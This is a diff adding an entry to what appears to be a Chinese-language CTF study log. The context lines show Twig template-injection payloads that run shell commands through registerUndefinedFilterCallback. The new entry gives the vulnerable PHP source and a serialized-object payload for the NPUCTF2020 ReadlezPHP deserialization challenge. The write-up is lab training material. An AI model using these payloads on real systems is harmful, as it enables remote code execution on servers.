@@ -51,3 +51,41 @@
                                                                      第三步：user改成{{_self.env.registerUndefinedFilterCallback("exec")}} {{_self.env.getFilter("ls /")}}，结果回显Hello，
                                                                              猜测为exec只是会打印最后一行结果，最后一行为空，所以没有回显。
                                                                              之后尝试{{_self.env.registerUndefinedFilterCallback("system")}} {{_self.env.getFilter("ls / > /tmp/out")}}                                                                                    {{_self.env.getFilter("cat /tmp/out")}}，成功
+
+
+6       2026/5/14              [NPUCTF2020]ReadlezPHP                进入页面，没啥发现，f12开发者模式看到可以a标签，点击到达time.php?source页面，有源代码如下。可以得知，只用序列化一个HelloPhp对象
+                                                                     即可，他的b是函数名，a是参数便可以执行。
+                                                                     问题：起初使用eval作为b，结果不行，怀疑是过滤了，但是查找资料才知道php中eval、eachprint，unset()，isset()，empty()，
+                                                                     include，require，等不可作为函数，而是属于PHP语法构造的一部分
+                                                                     所以使用b=assert,a=phpinfo();即可成功在其中找到flag。值得注意的是即便b是assert，a是system，exec之类的都不可行，应该是无权限
+                                                                     最终payload：?data=O:8:"HelloPhp":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";s:6:"assert";}
+                                                                                   <?php
+                                                                                   #error_reporting(0);
+                                                                                   class HelloPhp
+                                                                                   {
+                                                                                       public $a;
+                                                                                       public $b;
+                                                                                       public function __construct(){
+                                                                                           $this->a = "Y-m-d h:i:s";
+                                                                                           $this->b = "date";
+                                                                                       }
+                                                                                       public function __destruct(){
+                                                                                           $a = $this->a;
+                                                                                           $b = $this->b;
+                                                                                           echo $b($a);
+                                                                                       }
+                                                                                   }
+                                                                                   $c = new HelloPhp;
+                                                                                   
+                                                                                   if(isset($_GET['source']))
+                                                                                   {
+                                                                                       highlight_file(__FILE__);
+                                                                                       die(0);
+                                                                                   }
+                                                                                   
+                                                                                   @$ppp = unserialize($_GET["data"]);
+              
+              
+              
+              
+                                                                                           
